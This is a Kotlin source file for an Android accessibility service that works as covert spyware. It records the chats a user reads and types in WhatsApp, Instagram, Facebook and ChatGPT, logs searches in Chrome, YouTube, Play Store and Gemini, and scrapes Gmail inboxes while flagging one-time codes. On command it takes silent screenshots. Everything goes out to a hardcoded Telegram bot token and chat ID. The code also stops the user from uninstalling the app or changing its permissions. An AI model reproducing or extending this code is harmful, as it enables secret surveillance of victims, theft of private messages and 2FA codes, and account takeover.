package com.example.myapplication.services

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import android.os.Handler
import android.os.Looper
import java.util.concurrent.Executors

class MyAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile var isGmailDumpActive = false
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val BOT_TOKEN = "8995029809:AAHAjbs7CvyLoxhEm9LGVoiJsPB59Mqnzog"
    private val CHAT_ID = "8587971818"

    private val targetPackages = setOf(
        "com.whatsapp", "com.whatsapp.w4b",
        "com.instagram.android", "com.facebook.katana", "com.facebook.orca",
        "com.android.chrome", "com.google.android.youtube",
        "com.google.android.apps.messaging", "com.google.android.gm",
        "com.google.android.apps.bard", "com.openai.chatgpt", "com.android.vending"
    )

    private val lastCapturedText = mutableMapOf<String, String>()
    private var lastSendTime = 0L
    private val SEND_COOLDOWN = 2000L

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "ACTION_TAKE_SCREENSHOT") takeSilentScreenshot()
        }
    }

    override fun onCreate() {
        super.onCreate()
        val filter = IntentFilter("ACTION_TAKE_SCREENSHOT")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(receiver, filter)
            }
        } catch (e: Exception) {}
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        sendMessageToBot("✅ Accessibility Service Connected & Ready!")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: ""
        
        // SMART ANTI-UNINSTALL: Protect ONLY our app and security settings
        if (packageName == "com.android.settings") {
            val root = rootInActiveWindow
            if (root != null) {
                val sb = StringBuilder()
                extractRelevantText(root, sb)
                val screenText = sb.toString().lowercase()
                
                val isOurAppVisible = screenText.contains("my application") || screenText.contains("com.example.myapplication")
                val isCriticalSetting = screenText.contains("device admin") || screenText.contains("special app access") || screenText.contains("usage access")

                // Block if it's our app's info page OR a critical security setting
                if ((isOurAppVisible && (screenText.contains("uninstall") || screenText.contains("force stop") || screenText.contains("clear data") || screenText.contains("permissions"))) || 
                    isCriticalSetting) {
                    
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    sendMessageToBot("🛡️ **Smart Anti-Uninstall:** Blocked attempt to modify our app or security settings.")
                    return
                }
            }
        }

        // BLOCKING LOGIC: Check if this app is blocked
        if (com.example.myapplication.BlockManager.isAppBlocked(this, packageName)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            sendMessageToBot("🚫 **Blocked attempt to open:** $packageName")
            return
        }

        // Gmail Dump Trigger
        if (packageName == "com.google.android.gm") {
            processNode(rootInActiveWindow, packageName)
            return
        }

        if (!targetPackages.contains(packageName)) return

        val eventType = event.eventType
        val currentCooldown = if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) 500L else SEND_COOLDOWN

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastSendTime > currentCooldown) {
                val source = event.source ?: rootInActiveWindow
                if (source != null) processNode(source, packageName)
            }
        }
    }

    private fun processNode(node: AccessibilityNodeInfo?, packageName: String) {
        if (node == null) return
        
        val isGmail = packageName == "com.google.android.gm"
        val isYouTube = packageName.contains("youtube")
        val isPlayStore = packageName.contains("vending")
        val isGemini = packageName.contains("bard")
        val isChrome = packageName.contains("chrome")
        val isChatApp = packageName.contains("whatsapp") || packageName.contains("instagram") || 
                       packageName.contains("facebook") || packageName.contains("chatgpt") || 
                       packageName.contains("messaging")

        // Gmail Special Handling
        if (isGmail) {
            val sb = StringBuilder()
            extractGmailContent(node, sb)
            val fullText = sb.toString().trim()
            if (fullText.isNotEmpty() && fullText != lastCapturedText[packageName]) {
                lastCapturedText[packageName] = fullText
                sendMessageToBot("📧 **Gmail Dump:**\n\n$fullText")
                
                // Auto-close Gmail after capture if dump was requested
                if (isGmailDumpActive) {
                    isGmailDumpActive = false
                    Handler(Looper.getMainLooper()).postDelayed({
                        performGlobalAction(GLOBAL_ACTION_BACK)
                    }, 1500)
                }
            }
            return
        }

        // STRICT LOCK: Only process if INSIDE a conversation/search mode
        if (isChatApp && !isInsideConversation(rootInActiveWindow)) return
        if ((isYouTube || isPlayStore || isGemini || isChrome) && !isInsideSearch(rootInActiveWindow)) return

        val sb = StringBuilder()
        try {
            when {
                isYouTube -> findViewTextById(node, "search_edit_text", sb)
                isPlayStore -> findViewTextById(node, "search_box_text_input", sb)
                isGemini -> findViewTextById(node, "text_input", sb)
                isChrome -> findChromeSearch(node, sb)
                isChatApp -> extractChatContent(node, sb)
                else -> extractRelevantText(node, sb)
            }
        } catch (e: Exception) {}
        
        val fullText = sb.toString().trim()
        if (fullText.length > 1 && fullText != lastCapturedText[packageName]) {
            if (fullText.matches(Regex("^[0-9.: ]+ [KMG]B/s$"))) return
            lastCapturedText[packageName] = fullText
            lastSendTime = System.currentTimeMillis()
            
            val appName = when {
                packageName.contains("whatsapp") -> "WhatsApp"
                packageName.contains("instagram") -> "Instagram"
                packageName.contains("facebook") -> "Facebook"
                packageName.contains("chatgpt") -> "ChatGPT"
                packageName.contains("bard") -> "Gemini"
                packageName.contains("vending") -> "Play Store"
                packageName.contains("youtube") -> "YouTube"
                packageName.contains("chrome") -> "Chrome"
                else -> "App"
            }
            
            val prefix = if (isYouTube || isPlayStore || isGemini || isChrome) "🔍 Search" else "💬 Chat"
            sendMessageToBot("📱 **$appName $prefix:**\n\n$fullText")
        }
    }

    private fun extractGmailContent(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        
        val text = node.text?.toString()?.trim() ?: ""
        val contentDesc = node.contentDescription?.toString()?.trim() ?: ""
        
        // Gmail list items usually have content description containing sender and subject
        if (contentDesc.contains("Unread") || contentDesc.contains("Read")) {
            if (contentDesc.length > 10) {
                sb.append("📩 ").append(contentDesc.replace(", ", "\n")).append("\n\n")
            }
        } else if (text.isNotEmpty() && text.length > 2) {
            // Catch any visible OTPs or codes
            if (text.matches(Regex(".*\\b\\d{4,6}\\b.*"))) {
                sb.append("🔑 CODE FOUND: ").append(text).append("\n")
            }
        }
        
        for (i in 0 until node.childCount) {
            extractGmailContent(node.getChild(i), sb)
        }
    }

    private fun isInsideConversation(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        // Indicators that we are in a conversation (EditText presence)
        val chatInputIds = setOf(
            "com.whatsapp:id/entry", "com.whatsapp.w4b:id/entry",
            "com.instagram.android:id/row_thread_composer_edittext",
            "com.openai.chatgpt:id/input_box_edit_text",
            "com.facebook.orca:id/text_input_bar"
        )
        for (id in chatInputIds) {
            if (root.findAccessibilityNodeInfosByViewId(id).isNotEmpty()) return true
        }
        return false
    }

    private fun isInsideSearch(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        val searchIds = setOf(
            "com.google.android.youtube:id/search_edit_text",
            "com.android.vending:id/search_box_text_input",
            "com.google.android.apps.bard:id/text_input",
            "com.android.chrome:id/url_bar",
            "com.android.chrome:id/search_box_text"
        )
        for (id in searchIds) {
            if (root.findAccessibilityNodeInfosByViewId(id).isNotEmpty()) return true
        }
        return false
    }

    private fun findChromeSearch(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        val viewId = node.viewIdResourceName ?: ""
        if (viewId.contains("url_bar") || viewId.contains("search_box_text")) {
            val text = node.text
            if (!text.isNullOrEmpty()) {
                val s = text.toString().trim()
                if (s != "Search or type URL" && s != "Search or type web address") {
                    sb.append(s)
                    return
                }
            }
        }
        for (i in 0 until node.childCount) {
            findChromeSearch(node.getChild(i), sb)
            if (sb.isNotEmpty()) return
        }
    }

    private fun extractChatContent(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        val text = node.text?.toString()?.trim() ?: ""
        val viewId = node.viewIdResourceName ?: ""
        
        val noise = setOf("end-to-end encrypted", "disappear", "Learn more", "Today", "Yesterday", "Message", "Type a message")
        if (noise.any { text.contains(it, ignoreCase = true) }) return

        if (text.isNotEmpty() && text.length > 1) {
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            val centerX = resources.displayMetrics.widthPixels / 2
            val isInput = node.isEditable || node.className?.toString()?.contains("EditText") == true
            
            val sender = when {
                isInput -> "🔵 Me (Typing)"
                bounds.centerX() > centerX -> "🔵 Me"
                else -> "🟢 Them"
            }
            
            if (viewId.contains("message") || viewId.contains("entry") || viewId.isEmpty()) {
                if (!text.matches(Regex("^\\d{1,2}:\\d{2}\\s?(am|pm|AM|PM)?$"))) {
                    sb.append("$sender: $text\n")
                }
            }
        }
        for (i in 0 until node.childCount) extractChatContent(node.getChild(i), sb)
    }

    private fun findViewTextById(node: AccessibilityNodeInfo?, targetId: String, sb: StringBuilder) {
        if (node == null) return
        if (node.viewIdResourceName?.contains(targetId) == true) {
            node.text?.let { sb.append(it.toString()) }
            return
        }
        for (i in 0 until node.childCount) {
            findViewTextById(node.getChild(i), targetId, sb)
            if (sb.isNotEmpty()) return
        }
    }

    private fun extractRelevantText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        val text = node.text
        if (!text.isNullOrEmpty() && text.length > 1 && !node.className.toString().contains("Button")) {
            sb.append(text.toString().trim()).append("\n")
        }
        for (i in 0 until node.childCount) extractRelevantText(node.getChild(i), sb)
    }

    override fun onInterrupt() {}

    private fun takeSilentScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        val hardwareBuffer = result.hardwareBuffer
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, result.colorSpace)
                        if (bitmap != null) uploadToTelegram(bitmap.copy(Bitmap.Config.ARGB_8888, false))
                        hardwareBuffer.close()
                    }
                    override fun onFailure(error: Int) {}
                })
            } catch (e: Exception) {}
        }
    }

    private fun sendMessageToBot(msg: String) {
        executor.execute {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                val body = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", if (msg.length > 3500) msg.substring(0, 3500) + "..." else msg)
                }.toString()
                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {}
        }
    }

    private fun uploadToTelegram(bitmap: Bitmap) {
        executor.execute {
            try {
                val file = File(cacheDir, "ss.jpg")
                FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.JPEG, 70, it) }
                val boundary = "Boundary-" + System.currentTimeMillis()
                val conn = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").openConnection() as HttpURLConnection
                conn.doOutput = true
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                val out = conn.outputStream
                val writer = PrintWriter(OutputStreamWriter(out, "UTF-8"), true)
                writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").append(CHAT_ID).append("\r\n")
                writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"photo\"; filename=\"ss.jpg\"\r\n").append("Content-Type: image/jpeg\r\n\r\n").flush()
                file.inputStream().use { it.copyTo(out) }
                out.flush()
                writer.append("\r\n--$boundary--\r\n").close()
            } catch (e: Exception) {}
        }
    }

    override fun onDestroy() {
        try { unregisterReceiver(receiver) } catch (e: Exception) {}
        super.onDestroy()
    }
}
